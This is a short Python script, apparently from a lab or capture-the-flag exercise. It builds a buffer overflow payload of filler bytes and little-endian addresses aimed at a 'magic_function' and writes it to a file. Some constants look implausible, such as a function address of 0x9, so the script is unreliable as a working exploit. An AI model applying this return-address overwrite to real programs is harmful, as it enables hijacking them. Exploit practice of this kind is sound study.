buffer_size = 81
saved_frame_pointer = 4
address_magic_function = 0x9
add = 0x36
address = 0x08048476

# Create payload
payload = b'A' * buffer_size  # Fill the buffer
payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function
payload += add.to_bytes(4, 'little')
payload += address.to_bytes(4, 'little')



# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)